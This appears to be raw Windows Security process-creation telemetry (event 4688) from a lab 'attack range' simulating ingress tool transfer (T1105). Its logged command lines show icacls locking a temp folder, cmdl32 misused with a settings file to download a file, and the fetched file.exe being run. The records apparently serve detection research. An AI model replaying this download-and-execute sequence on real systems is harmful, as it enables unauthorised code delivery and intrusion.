Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744123
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f84
	New Process Name:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\file.exe

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:54 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744112
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1a60
	New Process Name:	C:\Windows\System32\icacls.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	icacls  C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105 /remove:d Administrator

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744062
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x19d4
	New Process Name:	C:\Windows\System32\cmdl32.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	cmdl32  /vpn /lan C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105\setting.txt

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
02/16/2022 08:57:53 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-host-mhaag-attack-range-791
TaskCategory=Process Creation
OpCode=Info
RecordNumber=52744055
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		WIN-HOST-MHAAG-\Administrator
	Account Name:		Administrator
	Account Domain:		WIN-HOST-MHAAG-
	Logon ID:		0xB50CB

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x178c
	New Process Name:	C:\Windows\System32\icacls.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x188c
	Creator Process Name:	C:\Windows\System32\cmd.exe
	Process Command Line:	icacls  C:\Users\ADMINI~1\AppData\Local\Temp\2\T1105 /deny Administrator:(OI)(CI)(DE,DC)

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
